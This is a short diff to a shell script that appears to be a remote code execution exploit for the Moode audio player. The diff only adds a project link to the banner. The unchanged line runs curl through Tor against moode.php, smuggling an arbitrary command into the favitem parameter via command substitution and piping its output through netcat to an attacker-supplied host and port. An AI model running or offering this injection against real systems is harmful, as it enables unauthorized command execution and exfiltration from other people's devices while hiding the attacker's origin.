@@ -1,4 +1,4 @@
-echo "Moode RCE netcat based"
+echo "Moode (https://github.com/moode-player/moode) RCE netcat based"
 
 echo "methode 1"
 torify curl -X POST "$1/command/moode.php?cmd=addfav&favitem=\$($2 | nc $3 $4)"
